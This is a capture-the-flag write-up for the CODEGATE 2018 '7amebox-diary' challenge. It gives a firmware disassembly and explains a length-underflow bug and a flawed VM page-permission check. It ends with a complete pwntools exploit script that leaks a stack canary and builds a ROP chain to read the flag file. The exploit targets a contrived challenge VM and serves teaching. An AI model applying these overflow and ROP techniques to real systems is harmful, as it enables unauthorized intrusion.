---
layout: post
title: "[CODEGATE 2018] 7amebox-diary"
comments: true
category: ctf
---

## before challenge

This challenge is also exec firmware like before. <br />
VM is same. <br />

***

## firmware

This is disassemble results. <br />

```
[intro]
0x0000   11 1   12        3 sub sp, 0x3
0x0005    4 1    2        6 mov r2, 0x6
0x000a    4 0    1       12 mov r1, sp
0x000c    4 1    0        4 mov r0, 0x4
0x0011    8 0    0        0 syscall r0
0x0013    0 0   10        1 mov r10, [r1]
0x0015    4 1    0        5 mov r0, 0x5
0x001a    8 0    0        0 syscall r0
0x001c    4 0    9        0 mov r9, r0
0x001e   30 1   13        4 call 0x27

[exit]
0x0023   21 0    0        0 xor r0, r0
0x0025    8 0    0        0 syscall r0

[main]
0x0027    6 0   11        0 push bp
0x0029    4 0   11       12 mov bp, sp
0x002b   11 1   12        6 sub sp, 0x6
0x0030    4 0    5       11 mov r5, bp
0x0032   11 1    5        3 sub r5, 0x3
0x0037    2 0    9        5 mov [r5], r9
0x0039    4 1    0     1731 mov r0, 0x6c3
0x003e   30 1   13     1566 call 0x661 [write]
0x0043   30 1   13      162 call 0xea [memset 0x59003 ~ 0x59021]
0x0048    4 1    0     2471 mov r0, 0x9a7
0x004d   30 1   13     1551 call 0x661 [write]
0x0052    4 0    5       11 mov r5, bp
0x0054   11 1    5        6 sub r5, 0x6
0x0059    2 0   15        5 mov [r5], zero
0x005b    4 1    1        3 mov r1, 0x3
0x0060    4 0    0        5 mov r0, r5
0x0062   30 1   13     1448 call 0x60f [stdin read]
0x0067    4 0    5       11 mov r5, bp
0x0069   11 1    5        6 sub r5, 0x6
0x006e    1 0    6        5 movb r6, [r5]
0x0070   24 1    6       49 cmpb r6, 0x31
0x0075   28 1   13       10 jnz 0x84
0x007a   30 1   13      175 call 0x12e [listDiary]
0x007f   29 1   13       75 jmp 0xcf
0x0084   24 1    6       50 cmpb r6, 0x32
0x0089   28 1   13       10 jnz 0x98
0x008e   30 1   13      349 call 0x1f0 [writeDiary]
0x0093   29 1   13       55 jmp 0xcf
0x0098   24 1    6       51 cmpb r6, 0x33
0x009d   28 1   13       10 jnz 0xac
0x00a2   30 1   13      626 call 0x319 [showDiary]
0x00a7   29 1   13       35 jmp 0xcf
0x00ac   24 1    6       52 cmpb r6, 0x34
0x00b1   28 1   13       10 jnz 0xc0
0x00b6   30 1   13      919 call 0x452 [editDiary]
0x00bb   29 1   13       15 jmp 0xcf
0x00c0   24 1    6       53 cmpb r6, 0x35
0x00c5   28 1   13        5 jnz 0xcf
0x00ca   29 1   13        5 jmp 0xd4
0x00cf   29 1   13  2097012 jmp 0x43
0x00d4    4 0    5       11 mov r5, bp
0x00d6   11 1    5        3 sub r5, 0x3
0x00db    0 0    6        5 mov r6, [r5]
0x00dd   23 0    6        9 cmp r6, r9
0x00df   28 1   13     1209 jnz 0x59d
0x00e4    4 0   12       11 mov sp, bp
0x00e6    7 0   11        0 pop bp
0x00e8    7 0   13        0 pop pc

[memset 0x59003 ~ 0x59021]
0x00ea    6 0   11        0 push bp
0x00ec    4 0   11       12 mov bp, sp
0x00ee   11 1   12        3 sub sp, 0x3
0x00f3    4 0    5       11 mov r5, bp
0x00f5   11 1    5        3 sub r5, 0x3
0x00fa    2 0    9        5 mov [r5], r9
0x00fc    4 0    5       10 mov r5, r10
0x00fe    2 0   15        5 mov [r5], zero
0x0100    4 0    5       10 mov r5, r10
0x0102    9 1    5        3 add r5, 0x3
0x0107    4 1    2       30 mov r2, 0x1e
0x010c    4 1    1        0 mov r1, 0x0
0x0111    4 0    0        5 mov r0, r5
0x0113   30 1   13     1171 call 0x5ab [memset]
0x0118    4 0    5       11 mov r5, bp
0x011a   11 1    5        3 sub r5, 0x3
0x011f    0 0    6        5 mov r6, [r5]
0x0121   23 0    6        9 cmp r6, r9
0x0123   28 1   13     1141 jnz 0x59d
0x0128    4 0   12       11 mov sp, bp
0x012a    7 0   11        0 pop bp
0x012c    7 0   13        0 pop pc

[listDiary]
0x012e    6 0   11        0 push bp
0x0130    4 0   11       12 mov bp, sp
0x0132   11 1   12        9 sub sp, 0x9
0x0137    4 0    5       11 mov r5, bp
0x0139   11 1    5        3 sub r5, 0x3
0x013e    2 0    9        5 mov [r5], r9
0x0140    4 0    5       11 mov r5, bp
0x0142   11 1    5        6 sub r5, 0x6
0x0147    4 1    6        1 mov r6, 0x1
0x014c    2 0    6        5 mov [r5], r6
0x014e    4 1    0     2262 mov r0, 0x8d6
0x0153   30 1   13     1289 call 0x661 [write]
0x0158    4 1    0     2275 mov r0, 0x8e3
0x015d   30 1   13     1279 call 0x661 [write]
0x0162    4 0    5       11 mov r5, bp
0x0164   11 1    5        6 sub r5, 0x6
0x0169    0 0    6        5 mov r6, [r5]
0x016b    4 0    5       10 mov r5, r10
0x016d    0 0    7        5 mov r7, [r5]
0x016f   23 0    6        7 cmp r6, r7
0x0171   25 1   13       90 ja 0x1d0
0x0176    4 0    5       11 mov r5, bp
0x0178   11 1    5        9 sub r5, 0x9
0x017d    4 0    7        6 mov r7, r6
0x017f    9 1    7       48 add r7, 0x30
0x0184    3 0    7        5 movb [r5], r7
0x0186   17 0    5        0 inc r5
0x0188    4 1    7       41 mov r7, 0x29
0x018d    3 0    7        5 movb [r5], r7
0x018f   17 0    5        0 inc r5
0x0191    3 0   15        5 movb [r5], zero
0x0193    4 0    5       11 mov r5, bp
0x0195   11 1    5        9 sub r5, 0x9
0x019a    4 0    0        5 mov r0, r5
0x019c   30 1   13     1216 call 0x661 [write]
0x01a1    4 0    5       11 mov r5, bp
0x01a3   11 1    5        6 sub r5, 0x6
0x01a8    0 0    0        5 mov r0, [r5]
0x01aa   30 1   13     1285 call 0x6b4
0x01af   30 1   13     1197 call 0x661
0x01b4    4 1    0     2514 mov r0, 0x9d2 [getAddrofDiary]
0x01b9   30 1   13     1187 call 0x661 [write]
0x01be    4 0    5       11 mov r5, bp
0x01c0   11 1    5        6 sub r5, 0x6
0x01c5    0 0    6        5 mov r6, [r5]
0x01c7   17 0    6        0 inc r6
0x01c9    2 0    6        5 mov [r5], r6
0x01cb   29 1   13  2097042 jmp 0x162
0x01d0    4 1    0     2275 mov r0, 0x8e3
0x01d5   30 1   13     1159 call 0x661 [write]
0x01da    4 0    5       11 mov r5, bp
0x01dc   11 1    5        3 sub r5, 0x3
0x01e1    0 0    6        5 mov r6, [r5]
0x01e3   23 0    6        9 cmp r6, r9
0x01e5   28 1   13      947 jnz 0x59d
0x01ea    4 0   12       11 mov sp, bp
0x01ec    7 0   11        0 pop bp
0x01ee    7 0   13        0 pop pc

[writeDiary]
0x01f0    6 0   11        0 push bp
0x01f2    4 0   11       12 mov bp, sp
0x01f4   11 1   12        6 sub sp, 0x6
0x01f9    4 0    5       11 mov r5, bp
0x01fb   11 1    5        3 sub r5, 0x3
0x0200    2 0    9        5 mov [r5], r9
0x0202    4 0    5       10 mov r5, r10
0x0204    0 0    6        5 mov r6, [r5]
0x0206   23 1    6        9 cmp r6, 0x9
0x020b   26 1   13       15 jb 0x21f
0x0210    4 1    0     2329 mov r0, 0x919
0x0215   30 1   13     1095 call 0x661
0x021a   29 1   13      228 jmp 0x303
0x021f   17 0    6        0 inc r6
0x0221    2 0    6        5 mov [r5], r6
0x0223    4 1    2        6 mov r2, 0x6
0x0228    4 0    5       11 mov r5, bp
0x022a   11 1    5        6 sub r5, 0x6
0x022f    4 0    1        5 mov r1, r5
0x0231    4 1    0        4 mov r0, 0x4
0x0236    8 0    0        0 syscall r0
0x0238    4 0    5       11 mov r5, bp
0x023a   11 1    5        6 sub r5, 0x6
0x023f    0 0    7        5 mov r7, [r5]
0x0241    4 0    5       10 mov r5, r10
0x0243    4 0    8        6 mov r8, r6
0x0245   15 1    8        3 mul r8, 0x3
0x024a    9 0    5        8 add r5, r8
0x024c    2 0    7        5 mov [r5], r7
0x024e    4 1    0     2354 mov r0, 0x932
0x0253   30 1   13     1033 call 0x661 [write]
0x0258    4 0    5       11 mov r5, bp
0x025a   11 1    5        6 sub r5, 0x6
0x025f    0 0    6        5 mov r6, [r5]
0x0261    4 1    1       30 mov r1, 0x1e
0x0266    4 0    0        6 mov r0, r6
0x0268   30 1   13      930 call 0x60f [stdin read]
0x026d   18 0    0        0 dec r0
0x026f    4 0    5       11 mov r5, bp
0x0271   11 1    5        6 sub r5, 0x6
0x0276    0 0    6        5 mov r6, [r5]
0x0278    9 0    6        0 add r6, r0
0x027a    3 0   15        6 movb [r6], zero
0x027c    4 1    0     2369 mov r0, 0x941
0x0281   30 1   13      987 call 0x661 [write]
0x0286    4 0    5       11 mov r5, bp
0x0288   11 1    5        6 sub r5, 0x6
0x028d    0 0    6        5 mov r6, [r5]
0x028f    9 1    6       30 add r6, 0x1e
0x0294    4 1    1     1200 mov r1, 0x4b0
0x0299    4 0    0        6 mov r0, r6
0x029b   30 1   13      879 call 0x60f [stdin read]
0x02a0   18 0    0        0 dec r0
0x02a2    4 0    5       11 mov r5, bp
0x02a4   11 1    5        6 sub r5, 0x6
0x02a9    0 0    6        5 mov r6, [r5]
0x02ab    9 1    6       30 add r6, 0x1e
0x02b0    9 0    6        0 add r6, r0
0x02b2    3 0   15        6 movb [r6], zero
0x02b4    4 0    5       11 mov r5, bp
0x02b6   11 1    5        6 sub r5, 0x6
0x02bb    0 0    6        5 mov r6, [r5]
0x02bd    9 1    6     1260 add r6, 0x4ec
0x02c2    4 0    1        0 mov r1, r0
0x02c4    4 0    0        6 mov r0, r6
0x02c6   30 1   13      836 call 0x60f [stdin read]
0x02cb    4 0    5       11 mov r5, bp
0x02cd   11 1    5        6 sub r5, 0x6
0x02d2    0 0    6        5 mov r6, [r5]
0x02d4    4 0    7        6 mov r7, r6
0x02d6    9 1    6       30 add r6, 0x1e
0x02db    9 1    7     1260 add r7, 0x4ec
0x02e0   21 0    8        8 xor r8, r8
0x02e2   23 1    8     1200 cmp r8, 0x4b0
0x02e7   27 1   13       23 jz 0x303
0x02ec   21 0    5        5 xor r5, r5
0x02ee   21 0    4        4 xor r4, r4
0x02f0    1 0    5        6 movb r5, [r6]
0x02f2    1 0    4        7 movb r4, [r7]
0x02f4   21 0    5        4 xor r5, r4
0x02f6    3 0    5        6 movb [r6], r5
0x02f8   17 0    6        0 inc r6
0x02fa   17 0    7        0 inc r7
0x02fc   17 0    8        0 inc r8
0x02fe   29 1   13  2097119 jmp 0x2e2
0x0303    4 0    5       11 mov r5, bp
0x0305   11 1    5        3 sub r5, 0x3
0x030a    0 0    6        5 mov r6, [r5]
0x030c   23 0    6        9 cmp r6, r9
0x030e   28 1   13      650 jnz 0x59d
0x0313    4 0   12       11 mov sp, bp
0x0315    7 0   11        0 pop bp
0x0317    7 0   13        0 pop pc

[showDiary]
0x0319    6 0   11        0 push bp
0x031b    4 0   11       12 mov bp, sp
0x031d   11 1   12     1209 sub sp, 0x4b9
0x0322    4 0    5       11 mov r5, bp
0x0324   11 1    5        3 sub r5, 0x3
0x0329    2 0    9        5 mov [r5], r9
0x032b    4 1    0     2428 mov r0, 0x97c
0x0330   30 1   13      812 call 0x661 [write]
0x0335    4 1    1        2 mov r1, 0x2
0x033a    4 0    5       11 mov r5, bp
0x033c   11 1    5        6 sub r5, 0x6
0x0341    4 0    0        5 mov r0, r5
0x0343   30 1   13      711 call 0x60f [read]
0x0348   21 0    6        6 xor r6, r6
0x034a    4 0    5       11 mov r5, bp
0x034c   11 1    5        6 sub r5, 0x6
0x0351    1 0    6        5 movb r6, [r5]
0x0353   24 1    6       49 cmpb r6, 0x31
0x0358   26 1   13      223 jb 0x43c
0x035d   24 1    6       57 cmpb r6, 0x39
0x0362   25 1   13      213 ja 0x43c
0x0367   12 1    6       48 subb r6, 0x30
0x036c    4 0    5       10 mov r5, r10
0x036e    0 0    7        5 mov r7, [r5]
0x0370   23 0    6        7 cmp r6, r7
0x0372   25 1   13      197 ja 0x43c
0x0377    4 0    0        6 mov r0, r6
0x0379   30 1   13      822 call 0x6b4 [getAddrofDiary]
0x037e    4 0    5       11 mov r5, bp
0x0380   11 1    5        9 sub r5, 0x9
0x0385    2 0    0        5 mov [r5], r0
0x0387    4 1    0     2275 mov r0, 0x8e3
0x038c   30 1   13      720 call 0x661
0x0391    4 1    0     2361 mov r0, 0x939
0x0396   30 1   13      710 call 0x661
0x039b    4 0    5       11 mov r5, bp
0x039d   11 1    5        9 sub r5, 0x9
0x03a2    0 0    0        5 mov r0, [r5]
0x03a4   30 1   13      696 call 0x661
0x03a9    4 1    0     2514 mov r0, 0x9d2
0x03ae   30 1   13      686 call 0x661
0x03b3    4 1    0     2275 mov r0, 0x8e3
0x03b8   30 1   13      676 call 0x661
0x03bd    4 1    2     1200 mov r2, 0x4b0
0x03c2    4 0    5       11 mov r5, bp
0x03c4   11 1    5        9 sub r5, 0x9
0x03c9    0 0    5        5 mov r5, [r5]
0x03cb    9 1    5       30 add r5, 0x1e
0x03d0    4 0    1        5 mov r1, r5
0x03d2    4 0    5       11 mov r5, bp
0x03d4   11 1    5     1209 sub r5, 0x4b9
0x03d9    4 0    0        5 mov r0, r5
0x03db   30 1   13      505 call 0x5d9 [movContenttoStack]
0x03e0    4 0    5       11 mov r5, bp
0x03e2   11 1    5     1209 sub r5, 0x4b9
0x03e7    4 0    6        5 mov r6, r5
0x03e9    4 0    5       11 mov r5, bp
0x03eb   11 1    5        9 sub r5, 0x9
0x03f0    0 0    7        5 mov r7, [r5]
0x03f2    9 1    7     1260 add r7, 0x4ec
0x03f7   21 0    8        8 xor r8, r8
0x03f9   23 1    8     1200 cmp r8, 0x4b0
0x03fe   27 1   13       23 jz 0x41a
0x0403   21 0    5        5 xor r5, r5
0x0405   21 0    4        4 xor r4, r4
0x0407    1 0    5        6 movb r5, [r6]
0x0409    1 0    4        7 movb r4, [r7]
0x040b   21 0    5        4 xor r5, r4
0x040d    3 0    5        6 movb [r6], r5
0x040f   17 0    6        0 inc r6
0x0411   17 0    7        0 inc r7
0x0413   17 0    8        0 inc r8
0x0415   29 1   13  2097119 jmp 0x43b
0x041a    4 0    5       11 mov r5, bp
0x041c   11 1    5     1209 sub r5, 0x4b9
0x0421    4 0    0        5 mov r0, r5
0x0423   30 1   13      569 call 0x661
0x0428    4 1    0     2514 mov r0, 0x9d2
0x042d   30 1   13      559 call 0x661
0x0432    4 1    0     2275 mov r0, 0x8e3
0x0437   30 1   13      549 call 0x661
0x043c    4 0    5       11 mov r5, bp
0x043e   11 1    5        3 sub r5, 0x3
0x0443    0 0    6        5 mov r6, [r5]
0x0445   23 0    6        9 cmp r6, r9
0x0447   28 1   13      337 jnz 0x59d
0x044c    4 0   12       11 mov sp, bp
0x044e    7 0   11        0 pop bp
0x0450    7 0   13        0 pop pc

[editDiary]
0x0452    6 0   11        0 push bp
0x0454    4 0   11       12 mov bp, sp
0x0456   11 1   12        9 sub sp, 0x9
0x045b    4 0    5       11 mov r5, bp
0x045d   11 1    5        3 sub r5, 0x3
0x0462    2 0    9        5 mov [r5], r9
0x0464    4 1    0     2428 mov r0, 0x97c
0x0469   30 1   13      499 call 0x661 [write]
0x046e    4 1    1        2 mov r1, 0x2
0x0473    4 0    5       11 mov r5, bp
0x0475   11 1    5        6 sub r5, 0x6
0x047a    4 0    0        5 mov r0, r5
0x047c   30 1   13      398 call 0x60f [read]
0x0481   21 0    6        6 xor r6, r6
0x0483    4 0    5       11 mov r5, bp
0x0485   11 1    5        6 sub r5, 0x6
0x048a    1 0    6        5 movb r6, [r5]
0x048c   24 1    6       49 cmpb r6, 0x31
0x0491   26 1   13      241 jb 0x587
0x0496   24 1    6       57 cmpb r6, 0x39
0x049b   25 1   13      231 ja 0x587
0x04a0   12 1    6       48 subb r6, 0x30
0x04a5    4 0    5       10 mov r5, r10
0x04a7    0 0    7        5 mov r7, [r5]
0x04a9   23 0    6        7 cmp r6, r7
0x04ab   25 1   13      215 ja 0x587
0x04b0    4 0    0        6 mov r0, r6
0x04b2   30 1   13      509 call 0x6b4 [getAddrofDiary]
0x04b7    4 0    5       11 mov r5, bp
0x04b9   11 1    5        9 sub r5, 0x9
0x04be    2 0    0        5 mov [r5], r0
0x04c0    4 1    0     2354 mov r0, 0x932
0x04c5   30 1   13      407 call 0x661 [write]
0x04ca    4 0    5       11 mov r5, bp
0x04cc   11 1    5        9 sub r5, 0x9
0x04d1    0 0    6        5 mov r6, [r5]
0x04d3    4 1    1       30 mov r1, 0x1e
0x04d8    4 0    0        6 mov r0, r6
0x04da   30 1   13      304 call 0x60f [read]
0x04df   18 0    0        0 dec r0
0x04e1    4 0    5       11 mov r5, bp
0x04e3   11 1    5        9 sub r5, 0x9
0x04e8    0 0    6        5 mov r6, [r5]
0x04ea    9 0    6        0 add r6, r0
0x04ec    3 0   15        6 movb [r6], zero
0x04ee    4 1    0     2405 mov r0, 0x965
0x04f3   30 1   13      361 call 0x661 [write]
0x04f8    4 0    5       11 mov r5, bp
0x04fa   11 1    5        9 sub r5, 0x9
0x04ff    0 0    6        5 mov r6, [r5]
0x0501    9 1    6       30 add r6, 0x1e
0x0506    4 1    1     1200 mov r1, 0x4b0
0x050b    4 0    0        6 mov r0, r6
0x050d   30 1   13      253 call 0x60f [read]
0x0512   18 0    0        0 dec r0
0x0514    4 0    5       11 mov r5, bp
0x0516   11 1    5        9 sub r5, 0x9
0x051b    0 0    6        5 mov r6, [r5]
0x051d    9 1    6       30 add r6, 0x1e
0x0522    9 0    6        0 add r6, r0
0x0524    3 0   15        6 movb [r6], zero
0x0526    4 1    0     2415 mov r0, 0x96f
0x052b   30 1   13      305 call 0x661 [write]
0x0530    4 0    5       11 mov r5, bp
0x0532   11 1    5        9 sub r5, 0x9
0x0537    0 0    6        5 mov r6, [r5]
0x0539    9 1    6     1260 add r6, 0x4ec
0x053e    4 0    0        6 mov r0, r6
0x0540   30 1   13      284 call 0x661 [write]
0x0545    4 1    0     2514 mov r0, 0x9d2
0x054a   30 1   13      274 call 0x661 [write]
0x054f    4 0    5       11 mov r5, bp
0x0551   11 1    5        9 sub r5, 0x9
0x0556    0 0    6        5 mov r6, [r5]
0x0558    4 0    7        6 mov r7, r6
0x055a    9 1    6       30 add r6, 0x1e
0x055f    9 1    7     1260 add r7, 0x4ec
0x0564   21 0    8        8 xor r8, r8
0x0566   23 1    8     1200 cmp r8, 0x4b0
0x056b   27 1   13       23 jz 0x587
0x0570   21 0    5        5 xor r5, r5
0x0572   21 0    4        4 xor r4, r4
0x0574    1 0    5        6 movb r5, [r6]
0x0576    1 0    4        7 movb r4, [r7]
0x0578   21 0    5        4 xor r5, r4
0x057a    3 0    5        6 movb [r6], r5
0x057c   17 0    6        0 inc r6
0x057e   17 0    7        0 inc r7
0x0580   17 0    8        0 inc r8
0x0582   29 1   13  2097119 jmp 0x566
0x0587    4 0    5       11 mov r5, bp
0x0589   11 1    5        3 sub r5, 0x3
0x058e    0 0    6        5 mov r6, [r5]
0x0590   23 0    6        9 cmp r6, r9
0x0592   28 1   13        6 jnz 0x59d
0x0597    4 0   12       11 mov sp, bp
0x0599    7 0   11        0 pop bp
0x059b    7 0   13        0 pop pc

[canary fail]
0x059d    4 1    0     2436 mov r0, 0x984
0x05a2   30 1   13      186 call 0x661
0x05a7   21 0    0        0 xor r0, r0
0x05a9    8 0    0        0 syscall r0

[memset]
0x05ab    6 0    0        0 push r0
0x05ad    6 0    1        0 push r1
0x05af    6 0    2        0 push r2
0x05b1    6 0    9        0 push r9
0x05b3   23 1    2        0 cmp r2, 0x0
0x05b8   27 1   13       11 jz 0x5c8
0x05bd    3 0    1        0 movb [r0], r1
0x05bf   17 0    0        0 inc r0
0x05c1   18 0    2        0 dec r2
0x05c3   29 1   13  2097131 jmp 0x5b3
0x05c8    7 0    6        0 pop r6
0x05ca   23 0    6        9 cmp r6, r9
0x05cc   28 1   13  2097100 jnz 0x59d
0x05d1    7 0    2        0 pop r2
0x05d3    7 0    1        0 pop r1
0x05d5    7 0    0        0 pop r0
0x05d7    7 0   13        0 pop pc

[movContenttoStack]
0x05d9    6 0    0        0 push r0
0x05db    6 0    1        0 push r1
0x05dd    6 0    2        0 push r2
0x05df    6 0    3        0 push r3
0x05e1    6 0    9        0 push r9
0x05e3   23 1    2        0 cmp r2, 0x0
0x05e8   27 1   13       15 jz 0x5fc
0x05ed    1 0    3        1 movb r3, [r1]
0x05ef    3 0    3        0 movb [r0], r3
0x05f1   17 0    0        0 inc r0
0x05f3   17 0    1        0 inc r1
0x05f5   18 0    2        0 dec r2
0x05f7   29 1   13  2097127 jmp 0x5e3
0x05fc    7 0    6        0 pop r6
0x05fe   23 0    6        9 cmp r6, r9
0x0600   28 1   13  2097048 jnz 0x59d
0x0605    7 0    3        0 pop r3
0x0607    7 0    2        0 pop r2
0x0609    7 0    1        0 pop r1
0x060b    7 0    0        0 pop r0
0x060d    7 0   13        0 pop pc

[stdin read syscall]
0x060f    6 0    1        0 push r1
0x0611    6 0    2        0 push r2
0x0613    6 0    3        0 push r3
0x0615    6 0    9        0 push r9
0x0617    4 0    3        1 mov r3, r1
0x0619    4 0    2        0 mov r2, r0
0x061b    4 1    1        0 mov r1, 0x0
0x0620    4 1    0        3 mov r0, 0x3
0x0625    8 0    0        0 syscall r0
0x0627    7 0    6        0 pop r6
0x0629   23 0    6        9 cmp r6, r9
0x062b   28 1   13  2097005 jnz 0x59d
0x0630    7 0    3        0 pop r3
0x0632    7 0    2        0 pop r2
0x0634    7 0    1        0 pop r1
0x0636    7 0   13        0 pop pc

[stdout write syscall]
0x0638    6 0    1        0 push r1
0x063a    6 0    2        0 push r2
0x063c    6 0    3        0 push r3
0x063e    6 0    9        0 push r9
0x0640    4 0    3        1 mov r3, r1
0x0642    4 0    2        0 mov r2, r0
0x0644    4 1    1        1 mov r1, 0x1
0x0649    4 1    0        2 mov r0, 0x2
0x064e    8 0    0        0 syscall r0
0x0650    7 0    6        0 pop r6
0x0652   23 0    6        9 cmp r6, r9
0x0654   28 1   13  2096964 jnz 0x59d
0x0659    7 0    3        0 pop r3
0x065b    7 0    2        0 pop r2
0x065d    7 0    1        0 pop r1
0x065f    7 0   13        0 pop pc

[write]
0x0661    6 0    0        0 push r0
0x0663    6 0    1        0 push r1
0x0665    6 0    9        0 push r9
0x0667    4 0    1        0 mov r1, r0
0x0669   30 1   13       22 call 0x684
0x066e    5 0    0        1 xchg r0, r1
0x0670   30 1   13  2097091 call 0x638
0x0675    7 0    6        0 pop r6
0x0677   23 0    6        9 cmp r6, r9
0x0679   28 1   13  2096927 jnz 0x59d
0x067e    7 0    1        0 pop r1
0x0680    7 0    0        0 pop r0
0x0682    7 0   13        0 pop pc

[strlen]
0x0684    6 0    1        0 push r1
0x0686    6 0    2        0 push r2
0x0688    6 0    9        0 push r9
0x068a   21 0    1        1 xor r1, r1
0x068c   21 0    2        2 xor r2, r2
0x068e    1 0    2        0 movb r2, [r0]
0x0690   24 1    2        0 cmpb r2, 0x0
0x0695   27 1   13        9 jz 0x6a3
0x069a   17 0    0        0 inc r0
0x069c   17 0    1        0 inc r1
0x069e   29 1   13  2097131 jmp 0x68e
0x06a3    7 0    6        0 pop r6
0x06a5   23 0    6        9 cmp r6, r9
0x06a7   28 1   13  2096881 jnz 0x59d
0x06ac    4 0    0        1 mov r0, r1
0x06ae    7 0    2        0 pop r2
0x06b0    7 0    1        0 pop r1
0x06b2    7 0   13        0 pop pc

[getAddrofDiary]
0x06b4    4 0    5       10 mov r5, r10
0x06b6    4 0    6        0 mov r6, r0
0x06b8   15 1    6        3 mul r6, 0x3
0x06bd    9 0    5        6 add r5, r6
0x06bf    0 0    0        5 mov r0, [r5]
0x06c1    7 0   13        0 pop pc


0x6c3
====================================================
|                   SECRET_DIARY                   |
====================================================
|                   ___________                    |
|                  |     _     |                   |
|                  |    (_)    |                   |
|                  |   |   |   |                   |
|                  |   |___|   |                   |
|                  |___________|                   |
----------------------------------------------------

0x8d6
YOUR DIARY

0x8e3
----------------------------------------------------

0x919
no you can't

0x9a7
1) list
2) write
3) show
4) edit
5) quit
>
```

This is simple file to make diary. <br />
0x12e() -> Listing diary title <br />
0x1f0() -> Write diary. It receives title, content, secret_key. It saves content after encrpyt by secret_key. <br />
0x319() -> Receives input of diary index. Print that diary. <br />
0x452() -> Edit diary which write before. <br />
There's no function for delete diary, and only up to 9 items could be written.<br />
<br />
At 0x1f0(), it receives contents and change last byte to null byte, calculate length as inputLength -1. <br />
Generally, if last byte is '\x0a', it change to \x00, other case don't do that. <br />
If input content's length is 0, than secret_key's length is -1. <br />
It can cause input biger size than firmware wants, So we have to check we can send 0byte content. <br />

```python
class Stdin:
    def read(self, size):
        res = ''
        buf = sys.stdin.readline(size)
        for ch in buf:
            if ord(ch) > 0b1111111:
                break
            if ch == '\n':
                res += ch
                break
            res += ch
        return res
```

If it is real stdin, than it checks about content's length, but Stdin in this firmware, if a byte in string is out of range, it breaks right away. <br />
So just send '\x80' or other bytes that over 0x7f, than content length can be 0. <br />
<br />
Now we know a vulnerability to write big secret_key. <br />
Through this, we think about how to wirte secret_key, and leak memory values . <br />

***

## VM

```python
def write_memory(self, addr, data, length):
        if not length:
            return

        if self.memory.check_permission(addr, PERM_WRITE) and self.memory.check_permission(addr + length - 1, PERM_WRITE):
            for offset in range(length):
                self.memory[addr + offset] = data[offset] & 0b1111111
        else:
            self.terminate("[VM] Can't write memory")
```

There is another vulnerability in VM. <br />
That is verification process of input's permission if write to memory. <br />
It just checks first page and last page which we want to write memory. <br />
Middle pages can be written even if there's no permission for write. <br />
<br/>
Also, we can know which page is allocate when we write new diary. <br />
In python, it sorts by hash, so it returns same pages every time firmware exec. <br />
This is order of pages. <br />
0x0000 - 0x1000 - 0x59000 - 0xc4000 - 0x1c000 - 0x3a000 - ... - 0xf1000 - 0x7c000 - ... <br />
Fist diary is written in 0xc4000 page, and 9th diary is written in 0x7c000 page. <br />
<br />
I try to write from 8th page secret_key to just before of canary in stack. <br />
I think if print that key, i could get canary, but it couldn't be. <br />
This is beacuse when we read memory, it checks strlen, and in this process, every byte is mov to register.<br />
At mov opcode, it always check permission. <br />
Instead of that, if write secret_key from 2nd diary(0x1c000) to diary_list(0x59000), overwrite first diary's address to canary's address, and listing diary, we can get canary. <br />
After that, from 8th diary(0xf1000) to stack, we can cause bof by overwrite. <br />

***

## Ex flow

1. When writing 2nd diary, overwrite first diary's address of diary list to canary's address. <br />
2. Simply add 3rd diary ~ 7th diary.<br />
3. When 8th diary, overwrite to stack and cause bof overwrite. <br />
4. Through this, we can do ROP. <br />
5. By Using gadgets, mov sp and bp to others. space from main's bp to stack's end is too small. <br />
6. Add flag file to pipeline, write it to memory, read it from memory. <br />


***

## Ex code

```python
from pwn import *

context.log_level = 'debug'

r = remote('192.168.0.4', 8101)

def int_to_bytes(n):
    return n.to_bytes((n.bit_length() + 7) // 8, byteorder='big')[1:]

def write_memory(data):
    res = 0
    res |= (data & 0b1111111) << 16
    res |= (data & 0b11111110000000) >> 7
    res |= (data & 0b111111100000000000000) >> 6
    res |= 0b1 << 24
    return int_to_bytes(res)

def write_diary(title, content, secret_key):
    r.sendlineafter(b'>', b'2')
    r.sendlineafter(b'>', title)
    r.sendlineafter(b'>', content)
    r.send(secret_key)

for i in range(1):
    write_diary(b'title', b'content', b'secret_')


r.sendlineafter(b'>', b'2')
r.sendlineafter(b'>', b'canary')
r.sendlineafter(b'>', b'\x80')
r.sendline(b'A'*(0x59003-0x1c4ec-0x3) + write_memory(0x2) + write_memory(0xf5fd4))

r.sendlineafter(b'>', b'1')
r.recvuntil(b'1)')
canary = r.recvn(3)

for i in range(2, 7):
    write_diary(b'title', b'content', b'secret_')

payload = b'A'*(0xf5a00-0xf14ec-0x6) + b'flag\x00\x00'
payload += write_memory(0xf5b00) + write_memory(0x609)
payload += write_memory(0xf59fa) + write_memory(0x1) + write_memory(0x625)
payload += canary + write_memory(0x100) + write_memory(0xf5000) + write_memory(0x2) + write_memory(0x60b)
payload += write_memory(0x3) + write_memory(0x625)
payload += canary + write_memory(0x100) + write_memory(0xf5000) + write_memory(0x1) + write_memory(0x60b)
payload += write_memory(0x2) + write_memory(0x625)
payload += b'A' * (0x100 - 3 * 19)
payload += b'A' * (0xf5fb6-0xf5b00)
payload += canary
payload += write_memory(0x0) + write_memory(0x0) + write_memory(0x0) + write_memory(0x313)
payload += b'A' * 0x6 + write_memory(0xf5a00) + write_memory(0x313)

r.sendlineafter(b'>', b'2')
r.sendlineafter(b'>', b'rop')
r.sendlineafter(b'>', b'\x80')
r.sendline(payload)

r.interactive()
```